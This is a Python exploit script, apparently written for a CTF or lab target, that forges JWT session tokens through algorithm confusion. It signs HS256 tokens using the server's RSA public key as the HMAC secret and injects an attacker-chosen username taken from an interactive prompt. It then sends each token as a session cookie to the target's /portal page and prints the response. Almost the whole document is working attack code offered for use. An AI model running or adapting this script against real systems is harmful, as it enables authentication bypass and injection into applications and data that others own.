#!/usr/bin/python3
# Author: Hack.You

from termcolor import colored
from bs4 import BeautifulSoup
import requests
import json
import base64
import sys
import hmac
import hashlib

print(colored('''

 ___        _           _     ____
|_ _|_ __  (_) ___  ___| |_  | __ ) _   _
 | || '_ \ | |/ _ \/ __| __| |  _ \| | | |
 | || | | || |  __/ (__| |_  | |_) | |_| |
|___|_| |_|/ |\___|\___|\__| |____/ \__, |
         |__/                       |___/
 _   _            _   __   __
| | | | __ _  ___| | _\ \ / /__  _   _
| |_| |/ _` |/ __| |/ /\ V / _ \| | | |
|  _  | (_| | (__|   <  | | (_) | |_| |
|_| |_|\__,_|\___|_|\_\ |_|\___/ \__,_|

''' , 'red'))
print('\033[91m' + '@Author: Hack.You' + '\033[0m')

if len(sys.argv) < 2:
    print(colored(f'Usage: python3 {sys.argv[0]} http://127.0.0.1', 'blue'))
    sys.exit(0)

public_key = "-----BEGIN PUBLIC KEY-----\nMIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEA3dFqq0OaPITIrCHAN86q\nGYIbNAJYlyodym1PNrklp0pD0ddhit7omVeVY6JYq+BDHaMgS6mBr20ecAf7oBUA\nCAKgnAkZpUtUY0p5JMe5jEUbVVnZylwawiJP8MsU+F+vRf3UDSiJIRAff+rajdxb\ndubApQakRdy4HfxMFTUGJEDm91YpjHCpLXslXub5pWZtA+4QeKzWCMO70PwWcEYA\nYv0Gif0yR4hGKm5ugI2KzCT1CbJAE++ZHryR0oMHjFIEPwFjDqdcQk0Z+nuDlmJL\nvQdA2Y7O6k7OJLXbRvDH97+L4ouPcxj2gS+x25mlFBmiMZUXnj/ZqD2DGz5Yq+hB\nf4DRAALZAv5zsN2uiPjU98IAm4jdqTw+yUxUkdX5bDomPF1jFvdWygsY8Yo5J3pk\nxWhMvULam5kfs1Cu+RHR3fu9m7xi7QILkWVyOd8B0qfixtpGE20o6/VhuAS9rPBH\nAMih9//ztpKStW0NNhtfYfsl9xenqt1E9GVr3js/OUYIcC4ZOLZT4ulluL0gAGWu\nniDUq1os9iR2HzYBNOwlw77bipjACB0mxZE7WE2fQEtLnQ/K5yDQTQM4tr3r8X6L\nRTAP0iwG56rcYiQtmM/shSocenRr228os666rQwFnxT7jugl0sRlsFqZNzgXWDn/\n51qez+VrhIb63VuDyVKewPcCAwEAAQ==\n-----END PUBLIC KEY-----\n"

while True:
    username = str(input('Command:~ '))

    header = json.dumps({
        "alg":"HS256",
        "typ":"JWT"
    }).encode()

    payload = json.dumps({
        "username":username,
        "iat":1678667208
    }).encode()

    header_ = base64.urlsafe_b64encode(header).decode().rstrip("=")
    payload_ = base64.urlsafe_b64encode(payload).decode().rstrip("=")

    # sign a new signature (hmac needs key,msf & digestmod)
    signature = hmac.new(
        key=public_key.encode(),
        msg=f'{header_}.{payload_}'.encode(),
        digestmod = hashlib.sha256
    ).digest()

    # jwt token header.payload.signature
    sign = f'{header_}.{payload_}.{base64.urlsafe_b64encode(signature).decode()}'

    url = sys.argv[1]
    proxy = {'http':'http://127.0.0.1:8080'}
    cookies = {
        'session':sign.rstrip("=")
    }

    post = requests.get(f'{url}/portal', cookies=cookies, proxies=proxy)
    parse = BeautifulSoup(post.text, 'html.parser')
    print(parse.text)
